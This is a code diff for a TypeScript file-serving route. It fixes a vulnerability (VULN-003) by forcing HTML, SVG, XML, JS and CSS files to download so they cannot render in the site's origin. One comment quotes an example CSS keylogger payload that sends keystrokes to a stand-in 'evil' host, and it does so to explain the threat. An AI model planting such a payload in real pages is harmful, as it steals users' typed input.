@@ -4,8 +4,29 @@ import type { Dirent } from 'node:fs';
 import path from 'node:path';
 import type { DbHandles } from '../db/client.js';
 import { assertSafePath } from '../utils/path-safe.js';
+import { contentDisposition } from '../utils/content-disposition.js';
 import { HttpError } from '../utils/http-error.js';
 import { isProtectedPath } from '../utils/protected-paths.js';
+
+// Extensions whose content the browser would happily render in our origin
+// (HTML, scripted SVG, CSS-based exfil, JS, XML/XHTML). Even if a malicious
+// file arrives here legitimately (whitelisted user uploads then social-
+// engineers themselves into navigating to the URL), forcing a download
+// neutralises the in-origin phishing / CSS exfil paths. CSP `script-src
+// 'self'` already blocks <script>-based XSS on those, but CSS-based
+// keyloggers (`:focus { background: url(//evil/?key=) }`) and
+// look-alike forms remain feasible without the download header.
+const FORCE_DOWNLOAD_EXTS = new Set([
+  '.html',
+  '.htm',
+  '.xhtml',
+  '.svg',
+  '.xml',
+  '.js',
+  '.mjs',
+  '.cjs',
+  '.css',
+]);
 import {
   CreateDirectoryInput,
   RenameInput,
@@ -116,16 +137,15 @@ export function createWorkspaceRoutes(
     } finally {
       await fh.close();
     }
-    // Attempt to derive a content-type
+    // Derive a content-type. For extensions in FORCE_DOWNLOAD_EXTS we
+    // intentionally drop the native MIME and force `attachment` (VULN-003)
+    // so the browser cannot render the file in our origin.
     const ext = path.extname(abs).toLowerCase();
     const mimeMap: Record<string, string> = {
       '.txt': 'text/plain',
       '.md': 'text/markdown',
       '.json': 'application/json',
-      '.js': 'text/javascript',
       '.ts': 'text/typescript',
-      '.html': 'text/html',
-      '.css': 'text/css',
       '.png': 'image/png',
       '.jpg': 'image/jpeg',
       '.jpeg': 'image/jpeg',
@@ -133,11 +153,19 @@ export function createWorkspaceRoutes(
       '.webp': 'image/webp',
       '.pdf': 'application/pdf',
     };
-    const contentType = mimeMap[ext] ?? 'application/octet-stream';
+
+    const headers: Record<string, string> = {};
+    if (FORCE_DOWNLOAD_EXTS.has(ext)) {
+      const filename = path.basename(abs);
+      headers['content-type'] = 'application/octet-stream';
+      headers['content-disposition'] = contentDisposition('attachment', filename);
+    } else {
+      headers['content-type'] = mimeMap[ext] ?? 'application/octet-stream';
+    }
 
     return new Response(new Uint8Array(content), {
       status: 200,
-      headers: { 'content-type': contentType },
+      headers,
     });
   });
 
